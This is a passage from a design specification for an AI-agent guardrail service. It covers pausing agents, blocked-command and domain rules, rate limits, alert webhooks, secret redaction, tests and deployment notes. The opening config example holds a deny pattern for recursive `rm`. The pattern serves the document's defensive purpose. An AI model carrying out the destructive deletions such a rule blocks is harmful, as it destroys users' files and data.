  "blockedCommands": ["\\brm\\s+(-\\w+\\s+)*-\\w*[rR]\\w*"],
  "maxLlmCallsPerMinute": 30,
  "redactSecrets": false,
  "allowedDomains": null
}
```

### Status_Response (JSON)

```json
{ "agentId": "demo-bot", "paused": true, "pausedAt": "2026-10-14T18:02:11.000Z" }
```

### HTTP routes (additions)

| Route | Success | Missing agent | Errors |
| --- | --- | --- | --- |
| `GET /agents/{agentId}/status` | 200 Status_Response | 200 `{paused: false, pausedAt: null}`, no record created | 400 bad agentId, 401, 403 |
| `PUT /agents/{agentId}/status` body `{"paused": bool}` | 200 Status_Response | Creates the record (empty config) | 400, 401, 403 |

### SDK in-memory state (additions)

`_paused`, `_last_status_ok`, `_last_status_attempt`, `_pause_reported`, `_compiled_commands`, `_rate_times` (deque), `_rate_reported_until`, `_rate_lock`.

## Correctness Properties

Numbering continues from v1 (Properties 1 to 29). Tag comments use `# Feature: agent-watch-v2, Property N: <title>`.

### Control plane

#### Property 30: Pause decision and once-per-episode reporting

For any sequence of status outcomes (paused true/false, failures, malformed bodies) at fake-clock times and any interleaving of wrapped LLM calls and tool calls: a status request is attempted exactly when 5 s or more have passed since the previous attempt; the cached Pause_State equals the most recent successful response (false if none); every call made while cached-paused raises `AgentPaused` and never invokes the provider or tool; the number of `paused` blocked events equals the number of Pause_Episodes in which at least one call was attempted; no event is sent for calls made while not paused.

**Validates: Requirements 27.8 to 27.14**

#### Property 31: Status round trip, no-create reads, and inventory mirror

For any agentId and any sequence of `put_status` values from matching Credentials, `get_status` returns the last PUT value with a non-null `pausedAt` iff paused, the inventory item's `paused` equals it, and `guardrails` is unchanged by every status PUT. For an agentId with no record, `get_status` returns `paused: false` and the store is unchanged. A PUT with non-matching Credentials returns 403 and changes nothing. Any body other than `{"paused": bool}` returns 400 and changes nothing.

**Validates: Requirements 27.1 to 27.7**

### Config evolution

#### Property 32: Guardrail_Config v2 round trip and v1 compatibility

For any valid v2 config `c`, `parse_config(json.loads(json.dumps(to_json(c)))) == c` and `to_json(c)` has exactly the `KEYS`. For any valid v1-shaped body (only `dailySpendCapUsd` and `blockedPaths`), `parse_config` returns a config with `blocked_commands == ()`, `max_llm_calls_per_minute is None`, `redact_secrets is False`, `allowed_domains is None`. `item_to_record` on a stored v1 META item (no `paused`, v1 guardrails) yields `paused == False` and the same defaults. (Extends Property 3.)

**Validates: Requirements 36.1 to 36.4**

### Command guard

#### Property 33: Blocked-command decision matches the reference rule

For any list of patterns (generated from a grammar of literal words, `\s+`, `\b`, alternations, and character classes, plus a few hostile ones) and any tool arguments (strings with varied whitespace and case, lists/tuples of strings, non-string values, named `command` args), the wrapped tool raises `CommandBlocked`, never invokes the tool, and sends exactly one `blocked_command` event whose `attemptedCommand` equals the first Command_String (in candidate order) that some pattern matches, iff the reference rule holds: some candidate Command_String `s` (`" ".join(value.split())` for a str, `" ".join(items)` for an all-str list/tuple) satisfies `re.compile(p, re.IGNORECASE).search(s)` for some pattern `p`. Otherwise the tool runs and one `tool_call` event is sent. With no patterns, nothing changes from v1.

**Validates: Requirements 28.4 to 28.9, 28.17**

#### Property 34: Invalid command patterns are rejected without side effects

For any `blockedCommands` that is not a list, or has more than 100 entries, an empty entry, an entry over 256 chars, or an entry that raises `re.error`, `put_config` returns 400 naming `blockedCommands` and the store is unchanged. For any list of valid patterns (≤100, each 1..256 chars that compile), PUT then GET returns the same list in order. (Extends Properties 4 and 5.)

**Validates: Requirements 28.2, 28.3**

### Rate limit

#### Property 35: Sliding-window rate limit

For any limit N in 1..50 and any non-decreasing sequence of fake-clock call times, the i-th wrapped LLM call is blocked (raises `RateLimitExceeded`, provider not invoked) iff the number of earlier *allowed* calls with start time in `(t_i - 60, t_i]` is ≥ N; allowed calls invoke the provider and send one `llm_call` event; the number of `rate_limit` blocked events equals the number of distinct 60 s reporting windows that contain at least one blocked call; with no limit every call is allowed.

**Validates: Requirements 31.3 to 31.7**

### Alerts

#### Property 36: Alert fan-out

For any list of 0 to 3 publishers, any subset of which raise, and any valid event: on a newly stored `blocked` event every publisher is called exactly once with the same `(subject, body)`, `ingest_event` returns 200, and the event is stored; on a duplicate or a non-blocked event no publisher is called. (Extends Property 16.)

**Validates: Requirements 30.2, 30.6, 30.7**

#### Property 37: Webhook payload and host allowlist

For any URL: `WebhookPublisher` makes a request iff the scheme is `https` and the host is exactly one of the three allowed hosts; for Discord hosts the JSON body has exactly the key `content`, for Slack exactly `text`; the text contains the subject and every body line; the text is at most 1900 characters; the timeout passed to the opener is 3.0. For any URL not allowed, `publish` returns without calling the opener.

**Validates: Requirements 30.3, 30.4, 30.5**

### Alert content and validation for new types

#### Property 38: Alert content covers every Violation_Type

For any valid blocked event of any of the seven Violation_Types, `format_alert` returns a subject under 100 chars containing the violationType and agentId, and a body containing agentId, violationType, ts, eventId, and the type's attempt detail (`attemptedCostUsd`, `attemptedPath`, `attemptedCommand`, `attemptedUrl`, or the listed meta keys when present). No body line contains a control character. (Extends Property 17.)

**Validates: Requirements 27.12, 28.11, 31.9**

#### Property 39: New blocked events validate like the old ones

For any well-formed blocked event with violationType in the seven values and the matching required field, `ingest_event` stores it with `costUsd == 0.0`, and the timeline item carries `attemptedCommand`/`attemptedUrl` when present and null otherwise. For any such event with the type's required field missing, empty, non-string, or over 1024 chars, or with a violationType outside the seven values, `ingest_event` returns 400 and the store is unchanged. (Extends Properties 7 and 8.)

**Validates: Requirements 28.10, 31.8, 33.8, 34.6, 36.5**

### Optional groups

#### Property 40: Secret redaction is sound, idempotent, and non-mutating

For any text built from random words with zero or more injected synthetic secrets (one per Secret_Pattern, generated to match it): `redact_text` returns counts equal to the number injected per kind; the result contains no Secret_Pattern match; `redact_text(redact_text(s)[0])` equals `redact_text(s)[0]` with zero counts; text with no injected secret is returned unchanged; `redact_request` leaves the input `dict` deep-equal to a copy taken before the call and rewrites only the text locations of Req 33.2. (Group 14.)

**Validates: Requirements 33.2, 33.3, 33.5, 33.7**

#### Property 41: Domain allowlist decision

For any allowlist (null or entries with and without `*.`) and any tool arguments containing random URLs (mixed case hosts, trailing dots, ports, paths), the wrapped tool raises `DomainBlocked` with `attemptedUrl` equal to the first URL whose lowercased host matches no entry, iff the allowlist is a list and such a URL exists; otherwise the tool runs. (Group 15.)

**Validates: Requirements 34.3 to 34.5**

#### Property 42: Key file and discovery order

For any owner id and endpoint, in a temporary `HOME`: `agentwatch init` creates the Key_File with mode 0600 whose content is a 43-char urlsafe token; running it again exits 1 and leaves the file unchanged unless `--force`; `--quiet` output never contains the token; `agentwatch.init` with no key uses `AGENTWATCH_KEY` when set and the Key_File otherwise, and raises `ValueError` (naming both sources, containing no key) when neither exists. (Group 13.)

**Validates: Requirements 32.2 to 32.6**

## Error Handling (additions)

| Where | Condition | Behavior |
| --- | --- | --- |
| API | `PUT /status` body not `{"paused": bool}` | 400 `{"error": "paused: must be a boolean"}` (or `body:`/unknown-field message) |
| API | `set_paused` condition fails | 403; nothing written |
| API | `blockedCommands` entry does not compile | 400 `{"error": "blockedCommands: entry N is not a valid regular expression"}`; no `re.error` text is echoed |
| API | Webhook URL not on the allowlist | One `webhook_url_rejected` warning at startup; webhook publishes are skipped; SNS unaffected |
| API | Webhook POST fails or times out (3 s) | `alert_publish_failed` with publisher class and exception type; SNS still published; 200 |
| SDK | Status fetch fails, times out, or is malformed | Keep last Pause_State; warn (`PAUSE_NOT_ACTIVE_MSG` while never succeeded); next attempt ≥ 5 s later |
| SDK | Agent paused | One `paused` event per episode, then `AgentPaused` on every call until a status response says resumed |
| SDK | Pattern from the server does not compile | Skip it, warn once per pattern, enforce the rest |
| SDK | Rate limit reached | One `rate_limit` event per 60 s, `RateLimitExceeded` on every blocked call |
| SDK | No key in arg, env, or Key_File | `init` raises `ValueError` naming the three sources |
| CLI | Key_File exists without `--force` | Message with the path, exit 1, file untouched |
| Dashboard | `PUT /status` fails | `Alert` with the message; button returns to its previous label |
| Dashboard | Window fetch hits 20 pages | Chart renders what was fetched and shows "showing the most recent N events" |

## Testing Strategy

Same rules as v1: no AWS, no network; `InMemoryStore`, `FakePublisher`, `FakeTransport`, fake clock and sleep, fake LLM clients; Hypothesis with `@settings(max_examples=100)`; vitest + Testing Library + jsdom for the dashboard.

- **Properties 30 to 42** each get one test in the task that adds the logic, tagged `# Feature: agent-watch-v2, Property N: <title>`. Backend properties in `backend/tests/test_properties_*.py`, SDK ones in `sdk/tests/test_properties_*.py`. Properties that extend a v1 property (32 → 3, 34 → 4/5, 36 → 16, 38 → 17, 39 → 7/8) are new tests; the v1 tests stay untouched.
- **Unit tests**: route table has eight routes (api + template); `set_paused` DynamoDB request shape (`test_store_dynamo.py`); `WebhookPublisher` with a fake opener; handler builds `MultiPublisher` with or without the env var; `commandPresets.json` compiles and matches examples; CLI `init`/`doctor` with `tmp_path` HOME and `capsys`; demo `--sleep`, `GuardrailBlocked` catch, `run_shell` step, `--leak`; `e2e.sh` secret scan and new expected strings; README/docs statements.
- **Dashboard tests**: `bucketSpend` sums and bucket membership (randomized arrays with a seeded generator, plus boundary cases at the window edge); `fetchWindow` paging with a mocked `fetch` (empty page with cursor, stop on old ts, 20-page cap); `SpendChart` renders 24 `<rect>` and the empty state; `AgentSummary` progress bar values and the no-cap state; `PauseButton` two-click confirm and error path; `RulesEditor` sends `blockedCommands`, presets add without duplicates, rate input empty → null; `Timeline` describes all seven types and toggles details; `InventoryTable` Status column.
- **Not automated**: pause propagation latency (observed in rehearsal, expect ≤ 5 s plus one request), Discord/Slack delivery (watched on camera), alarm firing. Logged in `PROGRESS.md` during 17.5.

## Deployment notes for Kiro and Tejaswi

- Template changes (8.1 routes, 11.2 webhook parameter, 16.x alarms/streams) go on a `feat/` branch with a PR via the GitHub MCP server, as `workflow.md` requires for infra. Config-key additions are additive and may land on `main`.
- Every redeploy must pass `UsePreviousValue` for `AlertEmail`, `DashboardOrigin`, and (after 11.2) `AlertWebhookUrl`, or supply them explicitly. Never write the webhook URL or email into `samconfig.toml`; the repo is public.
- The dashboard auto-builds from `main` on Amplify. Dashboard tasks that depend on a new route (8.5, 10.3) are safe to merge before the backend deploy only because the UI treats a 404 on `/status` as "unknown" and still renders; deploy the backend first anyway.
- Between groups, run `scripts/e2e.sh` (about 2 minutes, 2 to 4 alert emails, under a cent).
